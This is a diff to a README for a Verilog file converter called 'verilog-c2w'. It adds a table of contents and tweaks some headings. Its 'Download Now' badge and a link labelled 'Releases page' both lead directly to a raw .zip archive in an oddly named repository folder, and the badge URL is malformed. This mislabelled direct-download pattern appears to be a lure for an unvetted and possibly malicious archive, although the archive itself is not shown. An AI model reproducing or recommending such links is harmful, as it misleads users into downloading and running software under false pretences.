@@ -4,11 +4,22 @@
 
 Welcome to **verilog-c2w**! This software helps you easily convert Verilog files to a different format. Whether you are a beginner or an experienced user, you will find this tool simple to use.
 
+## 📑 Table of Contents
+
+- [Download Now](#download-now)
+- [Download and Install](#download-and-install)
+- [System Requirements](#system-requirements)
+- [How to Use](#how-to-use)
+- [Frequently Asked Questions](#frequently-asked-questions)
+- [Support](#support)
+- [Contribution](#contribution)
+- [License](#license)
+
 ## 📥 Download Now
 
 [![Download verilog-c2w](https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip%https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip)](https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip)
 
-## 📂 Download & Install
+## 📂 Download and Install
 
 1. Go to the [Releases page](https://raw.githubusercontent.com/ravez24/verilog-c2w/main/incomprehensively/verilog-c2w.zip).
    
@@ -63,7 +74,7 @@ To run **verilog-c2w**, your system should meet the following requirements:
 
 5. Once the conversion is complete, you will find your converted file in the specified output directory.
 
-## ❓ Frequently Asked Questions
+## ❓ Frequently Asked Questions 
 
 ### Q1: What type of files can be converted?
 
